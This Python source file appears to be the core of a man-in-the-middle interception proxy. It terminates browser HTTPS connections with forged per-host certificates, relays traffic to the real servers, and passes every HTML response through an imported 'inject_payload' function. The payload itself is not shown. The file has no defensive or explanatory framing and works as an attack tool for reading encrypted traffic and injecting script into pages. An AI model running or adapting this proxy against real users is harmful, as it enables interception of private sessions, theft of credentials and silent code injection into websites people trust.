import asyncio
import ssl
from .cert_manager import CertManager
from payloads.inject_js import inject_payload

class Interceptor:
    def __init__(self, cert_manager):
        self.cert_manager = cert_manager

    async def handle_client(self, reader, writer):
        try:
            data = await reader.read(4096)
            if not data:
                writer.close()
                return

            # Detect direct TLS handshake
            if data.startswith(b'\x16\x03'):
                print("\n[!] Error: Direct TLS handshake detected. Configure browser to use HTTP Proxy, not SOCKS.")
                writer.close()
                return

            first_line = data.splitlines()[0] if data.splitlines() else b""
            if first_line.startswith(b'CONNECT'):
                await self.handle_https(reader, writer, data)
            else:
                await self.handle_http(reader, writer, data)
        except Exception as e:
            print(f"[!] Client error: {e}")
            writer.close()

    async def handle_http(self, reader, writer, initial_data):
        host = self.extract_host(initial_data)
        if not host:
            writer.close()
            return
        print(f"[*] HTTP Request: {host}")
        try:
            reader_server, writer_server = await asyncio.open_connection(host, 80)
            writer_server.write(initial_data)
            await writer_server.drain()
            await self.shuttle_traffic_streams(reader, writer, reader_server, writer_server)
        except Exception as e:
            print(f"[!] HTTP Connection failed ({host}): {e}")
            writer.close()

    async def handle_https(self, reader, writer, initial_data):
        hostname = "unknown"
        try:
            parts = initial_data.split()
            if len(parts) < 2:
                writer.close()
                return
            hostname = parts[1].decode().split(':')[0]

            # 1. Acknowledge the CONNECT request
            writer.write(b'HTTP/1.1 200 Connection Established\r\n\r\n')
            await writer.drain()

            # 2. Setup SSL context with our fake certificate
            cert_path, key_path = self.cert_manager.get_cert(hostname)
            ssl_context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context_client.load_cert_chain(certfile=cert_path, keyfile=key_path)
            
            # 3. Perform the SSL handshake with the browser
            try:
                # Passing context as first positional argument for maximum compatibility
                await writer.start_tls(ssl_context_client)
            except Exception as e:
                print(f"[!] SSL Handshake failed for {hostname}: {e}")
                print("[!] HINT: You must import ca.crt into your browser's trusted Authorities.")
                writer.close()
                return

            # 4. Connect to the real destination
            ssl_context_server = ssl.create_default_context()
            try:
                reader_server, writer_server = await asyncio.open_connection(
                    hostname, 443, ssl=ssl_context_server
                )
            except Exception as e:
                print(f"[!] Could not connect to {hostname}:443: {e}")
                writer.close()
                return

            # 5. Relay traffic
            await self.shuttle_traffic_streams(reader, writer, reader_server, writer_server)
            
        except Exception as e:
            print(f"[!] HTTPS Error ({hostname}): {e}")
            writer.close()

    async def shuttle_traffic_streams(self, reader_client, writer_client, reader_server, writer_server):
        async def pipe(reader, writer, is_response):
            try:
                while True:
                    data = await reader.read(8192)
                    if not data: break
                    
                    if is_response:
                        if b'text/html' in data or b'<body' in data.lower():
                            data = inject_payload(data)
                            
                    writer.write(data)
                    await writer.drain()
            except Exception:
                pass
            finally:
                writer.close()

        await asyncio.gather(
            pipe(reader_client, writer_server, False),
            pipe(reader_server, writer_client, True)
        )

    def extract_host(self, data):
        for line in data.splitlines():
            if line.lower().startswith(b'host: '):
                host = line.split(b':', 1)[1].strip().decode()
                return host.split(':')[0]
        return None
